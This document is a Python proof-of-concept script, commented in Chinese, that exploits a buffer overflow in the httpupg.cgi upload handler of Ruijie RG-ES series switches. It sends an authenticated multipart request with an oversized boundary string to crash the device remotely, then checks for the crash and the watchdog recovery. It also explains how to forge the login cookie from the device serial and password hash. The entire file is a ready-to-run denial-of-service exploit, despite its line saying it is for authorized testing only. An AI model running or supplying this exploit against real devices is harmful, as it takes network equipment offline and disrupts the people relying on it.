#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ruijie RG-ES 系列 (ESW_1.0(1)B1P48) httpupg.cgi multipart boundary 溢出 PoC
CWE-787/CWE-120: XDATA 全局缓冲区溢出 -> 远程崩溃 (认证后)
仅供授权安全测试使用。会真实打崩目标设备 4~12 秒。

用法: python poc_overflow.py <目标IP> <口令MD5>
  口令MD5 = md5(Web登录口令), 即登录Cookie的值 (cookie = "<设备SN>=<md5(口令)>")
"""
import sys, time, http.client

def main(ip, md5):
    B = "D" * 448  # 溢出阈值 ~420, 448 稳定触发
    body = (f"--{B}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="x.bin"\r\n\r\n'
            + "A" * 64 + f"\r\n--{B}--\r\n").encode()

    # SN 从登录页提取不到也没关系——认证只校验 cookie 值, 但带上正确 SN 更稳妥
    # 设备 SN 可通过登录页/设备标签获得; 也可以先发任意 SN 试
    for sn in ["G1U408T000054"]:  # 改成目标设备SN
        try:
            c = http.client.HTTPConnection(ip, timeout=10)
            c.request("POST", "/httpupg.cgi", body, {
                "Cookie": f"{sn}={md5}",
                "Content-Type": f"multipart/form-data; boundary={B}",
            })
            r = c.getresponse(); r.read(); c.close()
            print("[-] 请求正常返回, 未触发崩溃")
            return
        except Exception as e:
            print(f"[*] 连接异常({type(e).__name__}) —— 可能已触发崩溃")

    time.sleep(3)
    try:
        c = http.client.HTTPConnection(ip, timeout=4)
        c.request("GET", "/"); c.getresponse().read(); c.close()
        print("[-] 设备仍存活")
    except Exception:
        print("[+] 设备已崩溃! 等待看门狗恢复...")
        for i in range(15):
            time.sleep(4)
            try:
                c = http.client.HTTPConnection(ip, timeout=4)
                c.request("GET", "/"); c.getresponse().read(); c.close()
                print(f"[+] {(i+1)*4}s 后恢复 —— 溢出崩溃确认")
                return
            except Exception:
                pass
        print("[!] 60s 未恢复, 请物理检查设备")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(__doc__); sys.exit(1)
    main(sys.argv[1], sys.argv[2])
